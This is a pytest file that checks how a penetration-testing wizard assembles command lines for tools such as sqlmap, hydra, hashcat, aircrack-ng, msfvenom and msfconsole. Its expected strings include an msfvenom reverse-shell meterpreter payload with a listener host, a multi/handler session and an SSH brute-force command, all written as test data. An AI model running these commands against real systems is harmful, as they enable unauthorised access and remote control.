"""M2 tool builders: slot ordering, positional placement, guards, suite dispatch."""

import pytest

from wizard_core.builders import get_builder


def test_sqlmap_target_flag_not_positional():
    plan = get_builder("sqlmap")({"url": "http://t/p?id=1", "dbs": True})
    assert plan.bash_preview_string == "sqlmap -u 'http://t/p?id=1' --dbs"


def test_gobuster_mode_is_subcommand_first():
    plan = get_builder("gobuster")({"mode": "dir", "target": "https://s", "wordlist": "w", "threads": 40})
    assert plan.array_form[:2] == ["gobuster", "dir"]
    assert "-u" in plan.array_form and plan.array_form.index("-t") < plan.array_form.index("-u")


def test_gobuster_status_filter_mutual_exclusion():
    with pytest.raises(ValueError):
        get_builder("gobuster")({"mode": "dir", "target": "x", "wordlist": "w",
                                 "status_blacklist": "404", "status_whitelist": "200"})


def test_nikto_update_standalone():
    assert get_builder("nikto")({"update": True}).bash_preview_string == "nikto -update"


def test_hydra_positional_target_service_last():
    plan = get_builder("hydra")({"login_list": "u.txt", "password_list": "p.txt",
                                 "target": "10.0.0.1", "service": "ssh", "tasks": 4})
    toks = plan.array_form
    # creds precede the positional target+service
    assert toks.index("-L") < toks.index("10.0.0.1")
    assert toks[-2:] == ["10.0.0.1", "ssh"]


def test_john_hashfile_is_positional_last():
    plan = get_builder("john")({"wordlist": "rockyou.txt", "rules": True, "hashfile": "h.txt"})
    assert plan.array_form[-1] == "h.txt"
    assert "--wordlist=rockyou.txt" in plan.array_form


def test_hashcat_mode_and_positional_order():
    plan = get_builder("hashcat")({"hash_mode": 0, "attack_mode": 0,
                                   "hashfile": "h.txt", "wordlist": "rockyou.txt"})
    assert plan.array_form == ["hashcat", "-m", "0", "-a", "0", "h.txt", "rockyou.txt"]


def test_hashcat_unknown_profile_fails_loudly():
    with pytest.raises(ValueError):
        get_builder("hashcat")({"profile": "bogus", "hashfile": "h"})


def test_aircrack_suite_dispatch_and_sudo():
    b = get_builder("aircrack-ng")
    assert b({"binary": "airmon-ng", "action": "start", "iface": "wlan0"}).bash_preview_string == "sudo airmon-ng start wlan0"
    # aircrack-ng crack step is not privileged
    assert b({"binary": "aircrack-ng", "wordlist": "r.txt", "bssid": "AA", "capture": "c.cap"}).bash_preview_string.startswith("aircrack-ng ")


def test_tshark_source_xor_guard():
    with pytest.raises(ValueError):
        get_builder("tshark")({"source_iface": "eth0", "read_file": "f.pcap"})


def test_tshark_display_filter():
    plan = get_builder("tshark")({"read_file": "cap.pcap", "display_filter": "http"})
    assert plan.bash_preview_string == "tshark -r cap.pcap -Y http"


def test_msfvenom_payload_then_datastore_then_output():
    plan = get_builder("msfvenom")({
        "payload": "windows/x64/meterpreter/reverse_tcp", "lhost": "10.0.0.5",
        "lport": 4444, "format": "exe", "outfile": "shell.exe"})
    assert plan.array_form == [
        "msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
        "LHOST=10.0.0.5", "LPORT=4444", "-f", "exe", "-o", "shell.exe"]


def test_msfconsole_oneliner_from_grammar():
    plan = get_builder("msfconsole")({
        "module": "exploit/multi/handler",
        "sets": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "LHOST": "10.0.0.5"},
        "action": "exploit -j"})
    assert "-q" in plan.array_form and "-x" in plan.array_form
    script = plan.array_form[plan.array_form.index("-x") + 1]
    assert script.startswith("use exploit/multi/handler; set PAYLOAD")
    assert script.endswith("exploit -j")


def test_all_nine_tools_load():
    from pathlib import Path
    from wizard_core.loader import load_modules
    reg = load_modules(Path(__file__).resolve().parents[1] / "modules")
    expected = {"nmap", "sqlmap", "gobuster", "nikto", "hydra", "john",
                "hashcat", "aircrack-ng", "tshark", "metasploit"}
    assert expected <= set(reg.tools)
